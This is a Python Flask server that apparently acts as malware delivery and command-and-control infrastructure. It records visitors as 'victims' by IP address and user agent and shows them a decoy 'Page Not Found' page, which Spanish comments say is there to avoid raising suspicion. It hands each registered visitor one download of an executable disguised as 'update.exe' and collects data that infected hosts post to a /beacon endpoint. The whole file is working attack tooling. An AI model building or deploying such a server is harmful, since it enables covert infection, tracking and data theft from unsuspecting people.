from flask import Flask, request, jsonify, send_file
import datetime
import json
import os
import base64

app = Flask(__name__)
DB_FILE = "victims.json"
PAYLOAD_NAME = "update.exe"

def load_db():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, 'w') as f:
            json.dump({}, f)
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

@app.route('/')
def index():
    # <!-- PON TU ENLACE PERSONALIZADO AQUÍ -->
    # Ejemplo: return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    # Por ahora, devuelve una página de error 404 genérica para no levantar sospechas.
    user_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.utcnow().isoformat()
    
    db = load_db()
    victim_id = base64.b64encode(user_ip.encode()).decode('utf-8')
    
    if victim_id not in db:
        db[victim_id] = {
            'first_seen': timestamp,
            'last_seen': timestamp,
            'ip': user_ip,
            'user_agent': user_agent,
            'status': 'registered'
        }
        save_db(db)
    
    return send_file("static/index.html")

@app.route('/get_payload')
def get_payload():
    user_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    victim_id = base64.b64encode(user_ip.encode()).decode('utf-8')
    db = load_db()
    
    if victim_id in db and db[victim_id].get('status') == 'registered':
        db[victim_id]['status'] = 'sent'
        db[victim_id]['last_seen'] = datetime.datetime.utcnow().isoformat()
        save_db(db)
        return send_file(PAYLOAD_NAME, as_attachment=True, download_name=PAYLOAD_NAME)
    
    return "Not Found", 404

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_json()
    user_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    victim_id = base64.b64encode(user_ip.encode()).decode('utf-8')
    db = load_db()
    
    if victim_id in db:
        db[victim_id]['last_seen'] = datetime.datetime.utcnow().isoformat()
        if data:
            db[victim_id]['data'] = data
        save_db(db)
        return jsonify({"status": "ok"})
    
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    if not os.path.exists('static'):
        os.makedirs('static')
    with open('static/index.html', 'w') as f:
        f.write("<html><body><h1>Page Not Found</h1><p>The requested URL was not found on this server.</p></body></html>")
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))